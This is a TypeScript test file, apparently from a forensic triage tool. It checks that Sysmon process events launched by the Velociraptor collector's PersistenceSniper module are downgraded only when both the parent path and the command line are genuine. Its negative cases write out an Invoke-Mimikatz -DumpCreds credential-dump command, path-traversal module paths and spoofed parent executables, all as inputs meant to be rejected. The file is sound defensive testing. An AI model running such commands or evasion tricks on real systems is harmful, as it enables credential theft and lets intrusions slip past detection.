// "Non Interactive PowerShell" hits on it became finding f18 (High) on the real case. Two facts,
// BOTH required: the parent executable is the collector exe under its install root (canonical
// process.parent.executable — a path Sysmon recorded, not a string the child chose), and the
// command line names a file under the collector's Tools root. Parent alone is provenance, not
// enough (see the ParentProc= negative above); a Tools path alone is a string anyone can type.
describe("isCollectorSpawn — a process the Velociraptor client itself started", () => {
  const SYSMON = "Microsoft-Windows-Sysmon/Operational";
  const PWSH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const TOOLS_PSM1 =
    "C:\\Program Files\\Velociraptor\\Tools\\tmp2712975309\\PersistenceSniper\\PersistenceSniper.psm1";
  const SNIPER_CMD = `powershell -ExecutionPolicy bypass -command "import-module \\"${TOOLS_PSM1}\\"; Find-AllPersistence -IncludeHighFalsePositivesChecks"`;

  // The Sysmon EID 1 as the Windows mapper renders it (the Chainsaw importer reuses mapWindows).
  const spawn = (
    over: { parent?: string; cmd?: string; image?: string; severity?: MappedEvent["severity"] } = {},
  ) => {
    const m = mapWindows(
      {
        event_id: 1,
        channel: SYSMON,
        "@timestamp": "2026-09-20T19:34:56Z",
        event_data: {
          Image: over.image ?? PWSH,
          CommandLine: over.cmd ?? SNIPER_CMD,
          ParentImage: over.parent ?? INSTALL_EXE,
          ParentCommandLine: `"${INSTALL_EXE}" service run`,
          User: "NT AUTHORITY\\SYSTEM",
          ProcessId: "4711",
        },
      },
      "WS01",
      new Map(),
    )!;
    // Sigma graded the real row Medium; the rule must work whatever grade the row arrived with.
    m.severity = over.severity ?? "Medium";
    return m;
  };

  it("matches the PersistenceSniper launch: collector parent AND a Tools-root module", () => {
    const m = spawn();
    expect(m.canonical?.process?.parent?.executable).toBe(INSTALL_EXE);
    expect(isCollectorSpawn(m)).toBe(true);
    annotateCollectorDeployment(m, { servers: new Set() });
    expect(m.severity).toBe("Info");
    expect(m.origin).toBe("collector");
    expect(m.description).toMatch(/\[DFIR collector footprint — spawned by the Velociraptor client\]$/);
  });

  it("does NOT match the same command line under a parent outside the install root", () => {
    for (const parent of [
      "C:\\Users\\Public\\Velociraptor.exe",
      "C:\\ProgramData\\Velociraptor\\Velociraptor.exe",
      "C:\\Program Files\\Velociraptor\\..\\..\\Users\\v\\Velociraptor.exe",
      PWSH,
    ]) {
      const m = spawn({ parent });
      expect(isCollectorSpawn(m)).toBe(false);
      annotateCollectorDeployment(m, { servers: new Set() });
      expect(m.severity).toBe("Medium");
      expect(m.origin).toBeUndefined();
    }
  });

  it("does NOT match a collector parent whose command line names no Tools-root file", () => {
    for (const cmd of [
      "powershell -ExecutionPolicy bypass -command Invoke-Mimikatz -DumpCreds",
      'powershell -c "import-module C:\\ProgramData\\Velociraptor\\Tools\\tmp1\\x.psm1"',
      "powershell -c \"import-module 'C:\\Program Files\\Velociraptor\\Tools\\..\\..\\evil.psm1'\"",
    ]) {
      const m = spawn({ cmd });
      expect(isCollectorSpawn(m)).toBe(false);
      annotateCollectorDeployment(m, { servers: new Set() });
      expect(m.severity).toBe("Medium");
    }
  });

  it("never lowers a Critical — the same bound the script rule keeps", () => {
    const m = spawn({ severity: "Critical" });
    expect(isCollectorSpawn(m)).toBe(true);
    annotateCollectorDeployment(m, { servers: new Set() });
    expect(m.severity).toBe("Critical");
    expect(m.origin).toBeUndefined();
  });

  it("a non-process row naming both paths is untouched", () => {
    const m = ev({
      description: `Sysmon File created (EID 11) - Image=${INSTALL_EXE} - TargetFilename=${TOOLS_PSM1} @ WS01`,
    });
    expect(isCollectorSpawn(m)).toBe(false);
  });

  it("the earlier collector rules stamp origin:collector too, so the tagger cannot re-raise them", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${SERVER}:8889`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", "");
    const rows = [download(), install()];
    applyCollectorDeployment(rows);
    for (const r of rows) {
      expect(r.severity).toBe("Info");
      expect(r.origin).toBe("collector");
    }
  });
});
